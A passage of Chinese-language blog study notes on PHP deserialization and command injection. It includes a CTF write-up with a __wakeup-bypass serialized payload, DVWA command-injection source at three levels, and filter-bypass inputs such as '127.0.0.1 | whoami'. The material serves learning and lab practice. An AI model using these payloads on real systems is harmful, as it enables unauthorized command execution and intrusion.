class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = <span class="keyword">new</span> test(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;male&#x27;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span>-&gt;info();</span><br><span class="line"><span class="comment">//存在__sleep(函数，$info属性不会被存储</span></span><br><span class="line"><span class="variable">$temp</span> = serialize(<span class="variable">$me</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$temp</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = unserialize(<span class="variable">$temp</span>);</span><br><span class="line"><span class="comment">//__wakeup()组装的$info</span></span><br><span class="line"><span class="variable">$me</span>-&gt;info();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">运行结果：</span><br><span class="line">id: zhangsan, sex: male, age: <span class="number">18</span>&lt;br&gt;test::__sleep&lt;br&gt;O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;zhangsan&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;male&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">18</span>;&#125;&lt;br&gt;test::__wakeup&lt;br&gt;id: zhangsan, sex: male, age: <span class="number">18</span>&lt;br&gt;</span><br></pre></td></tr></table></figure>

<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br></pre></td></tr></table></figure>

<h5 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$sex</span>, <span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">&quot;id: %s, sex: %s, age: %d&quot;</span>, <span class="keyword">$this</span>-&gt;id, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = <span class="keyword">new</span> test(<span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;male&#x27;</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;__toString:&#x27;</span> . <span class="variable">$me</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">运行结果：</span><br><span class="line">__toString:id: zhangsan, sex: male, age: <span class="number">20</span>&lt;br&gt;</span><br></pre></td></tr></table></figure>



<p>方法调用顺序测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;aaaaaaa&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;bbbbbbb&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;__construct&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;__construct&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;__sleep&lt;br /&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;__wakeup&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建对象调用__construct</span></span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> test();</span><br><span class="line">    <span class="comment">//序列化对象调用__sleep</span></span><br><span class="line">    <span class="variable">$serialize</span> = serialize(<span class="variable">$object</span>);</span><br><span class="line">    <span class="comment">//输出序列化后的字符串</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;serialize: &#x27;</span>.<span class="variable">$serialize</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//反序列化对象调用__wakeup</span></span><br><span class="line">    <span class="variable">$unserialize</span>=unserialize(<span class="variable">$serialize</span>);</span><br><span class="line">    <span class="comment">//调用pt输出数据</span></span><br><span class="line">    <span class="variable">$unserialize</span>-&gt;pt();</span><br><span class="line">    <span class="comment">//脚本结束调用__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">运行结果：</span><br><span class="line">__construct&lt;br /&gt;__sleep&lt;br /&gt;serialize: O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;aaaaaaa&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;bbbbbbb&quot;</span>;&#125;&lt;br /&gt;__wakeup&lt;br /&gt;aaaaaaa&lt;br /&gt;__construct&lt;br /&gt;__construct&lt;br /&gt;</span><br></pre></td></tr></table></figure>

<p>（测试代码均来自大佬博客，并非原创）</p>
<p>测试题：[极客大挑战 2019]PHP</p>
<p>题目存在备份文件<a href="http://www.zip/">www.zip</a></p>
<p>源码为👇</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;  <span class="comment">//private</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;         </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//wakeup 把username变成了guest</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123; <span class="comment">//password 需要100</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123; <span class="comment">//username 需要是admin</span></span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">	<span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);   <span class="comment">//unserialize select变量</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结合上边提到的形成solution👇</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="keyword">new</span> Name());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//构造一个类使其满足题目要求，本题涉及到了__wakeup()函数的绕过</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/**wakeup()</span></span><br><span class="line"><span class="comment">     * unserialize前调用 用于预先准备对象资源</span></span><br><span class="line"><span class="comment">     序列化结果：O:4:&quot;Name&quot;:2：&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;因username和password都为private所以需要在类名两侧加上%00</span></span><br><span class="line"><span class="comment">     绕过__wakeup()函数需要使传入的属性个数大于真实属性个数（所以payload中的是3而不是序列化后的到的2</span></span><br><span class="line"><span class="comment">     得到payload：O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h2 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h2><h3 id="PHP的session机制"><a href="#PHP的session机制" class="headerlink" title="PHP的session机制"></a>PHP的session机制</h3><p>相关参数及含义（可以在php.ini中看到</p>
<p><a href="https://xz.aliyun.com/t/6640">更多有关php.ini的配置</a></p>
<table>
<thead>
<tr>
<th>Directive</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>session.save_handler</td>
<td>session保存形式。默认为files</td>
</tr>
<tr>
<td>session.save_path</td>
<td>session保存路径。</td>
</tr>
<tr>
<td>session.serialize_handler</td>
<td>session序列化存储所用处理器。默认为php。</td>
</tr>
<tr>
<td>session.upload_progress.cleanup</td>
<td>一旦读取了所有POST数据，立即清除进度信息。默认开启</td>
</tr>
<tr>
<td>session.upload_progress.enabled</td>
<td>将上传文件的进度信息存在session中。默认开启。</td>
</tr>
<tr>
<td>session.auto_start</td>
<td>指定会话模块是否在请求开始时启动一个会话，默认false</td>
</tr>
</tbody></table>
<p>存储机制</p>
<p>php中的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值</p>
<p>先通过一个样例代码，看看3种不同的 <strong>session</strong> 序列化处理器处理 <strong>session</strong> 的情况。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;T0mr&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据php.ini默认的session存储位置找到了session文件内容为： <code>name|s:4:&quot;T0mr&quot;;</code></p>
<p>当 <strong>session.serialize_handler=php_serialize</strong> 时，session文件为： <code>a:1:&#123;s:4:&quot;name&quot;;s:4:&quot;T0mr&quot;;&#125;</code></p>
<p>当 <strong>session.serialize_handler=php_binary</strong> 时，session文件内容为： <code>&lt;0x04&gt;names:4:&quot;T0mr&quot;;</code></p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名 + 竖线 + 经过serialize()函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize(php&gt;5.5.4)</td>
<td>经过serialize()函数序列化处理的数组</td>
</tr>
</tbody></table>
<p>PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化.</p>
]]></content>
      <categories>
        <category>web学习</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行漏洞学习笔记</title>
    <url>/2021/04/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>


<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="命令执行漏洞原理"><a href="#命令执行漏洞原理" class="headerlink" title="命令执行漏洞原理"></a>命令执行漏洞原理</h2><p>命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：system()、exec()、shell_exec()、eval()、passthru()，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</p>
<p>在操作系统中，“&amp; 、&amp;&amp; 、| 、 ||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令 .</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">command1;command2 : 先执行command1再执行command2</span><br><span class="line">command1 &amp; command2 ：不管command1执行成功与否，都会执行command2（将上一个命令的输出作为下一个命令的输入）</span><br><span class="line">command1 &amp;&amp; command2 ：先执行command1执行成功后才会执行command2</span><br><span class="line">command1 | command2 ：只执行command2</span><br><span class="line">command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</span><br></pre></td></tr></table></figure>

<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">



<h1 id="基于dvwa进行学习"><a href="#基于dvwa进行学习" class="headerlink" title="基于dvwa进行学习"></a>基于dvwa进行学习</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>由源码可知，并没有对我们输入的东西进行过滤，仅仅是判断了一下是不是Windows NT<br>提交 “127.0.0.1 | ipconfig” 可以得到目标的所有IP信息.<br>提交 “127.0.0.1 | whoami” 可以得到目标的用户信息.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">有关函数如下👇</span><br><span class="line">stristr(<span class="keyword">string</span>,search,before_search)</span><br><span class="line">搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 <span class="literal">FALSE</span></span><br><span class="line"></span><br><span class="line">该函数是不区分大小写的，如需进行区分大小写的搜索，请使用 strstr() 函数。</span><br><span class="line"></span><br><span class="line">php_uname (<span class="variable">$mode</span>)</span><br><span class="line">返回运行 PHP 的系统的有关信息，也就是返回运行 PHP 的操作系统的描述</span><br><span class="line"><span class="variable">$mode</span> 是单个字符，用于定义要返回什么信息：</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>：此为默认。包含序列 <span class="string">&quot;s n r v m&quot;</span> 里的所有模式。</span><br><span class="line"><span class="string">&#x27;s&#x27;</span>：操作系统名称。例如： FreeBSD。</span><br><span class="line"><span class="string">&#x27;n&#x27;</span>：主机名。例如： localhost.example.com。</span><br><span class="line"><span class="string">&#x27;r&#x27;</span>：版本名称，例如： <span class="number">5.1</span>.<span class="number">2</span>-RELEASE。</span><br><span class="line"><span class="string">&#x27;v&#x27;</span>：版本信息。操作系统之间有很大的不同。</span><br><span class="line"><span class="string">&#x27;m&#x27;</span>：机器类型。例如：i386。</span><br></pre></td></tr></table></figure>

<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p><font color=#999AAA >代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>不难发现只过滤了&amp;&amp;和;<br>那我们不用这两个就可以了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//相关函数</span></span><br><span class="line"></span><br><span class="line">str_replace(find,replace,<span class="keyword">string</span>,count)</span><br><span class="line">以其他字符替换字符串中的一些字符（区分大小写）</span><br><span class="line">find 必需。规定要查找的值</span><br><span class="line">replace 必需。规定替换 find 中的值的值</span><br><span class="line"><span class="keyword">string</span> 必需。规定被搜索的字符串</span><br><span class="line">count 可选。对替换数进行计数的变量</span><br><span class="line">该函数必须遵循下列规则：</span><br><span class="line">如果替换和替换目标都是数组，且需要替换的元素少于查找到的元素，那么多余元素将用空字符串进行替换</span><br><span class="line">如果替换的目标是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用</span><br><span class="line">注释：该函数区分大小写。请使用 str_ireplace() 函数执行不区分大小写的搜索</span><br><span class="line">注释：该函数是二进制安全的</span><br><span class="line"></span><br><span class="line">array_keys(<span class="keyword">array</span>,value,strict)</span><br><span class="line">返回包含数组中所有键名的一个新数组</span><br><span class="line"><span class="keyword">array</span> 必需。规定数组</span><br><span class="line">value 可选。您可以指定键值，然后只有该键值对应的键名会被返回</span><br><span class="line">strict 可选。与 value 参数一起使用。可能的值：</span><br><span class="line"><span class="literal">true</span> - 返回带有指定键值的键名。依赖类型，数字 <span class="number">5</span> 与字符串 “<span class="number">5</span>” 是不同的</span><br><span class="line"><span class="literal">false</span> - 默认值。不依赖类型，数字 <span class="number">5</span> 与字符串 “<span class="number">5</span>” 是相同的</span><br><span class="line">如果提供了第二个参数，则只返回键值为该值的键名</span><br><span class="line">如果 strict 参数指定为 <span class="literal">true</span>，则 PHP 会使用全等比较 (===) 来严格检查键值的数据类型</span><br></pre></td></tr></table></figure>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p><font color=#999AAA >代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>细心点可以发现过滤的’|’中多了一个空格（写成了’| ‘）那么用|就可以绕过<br>除此之外还有个好玩的就是可以利用过滤的顺序来绕过<br>也就是 127.0.0.1|| ipconfig<br>在||后多个空格，会先匹配到’| ‘，这样之后就等价于127.0.0.1|ipconfig</p>
<p>high难度的过滤较为全面但是仍有漏洞</p>
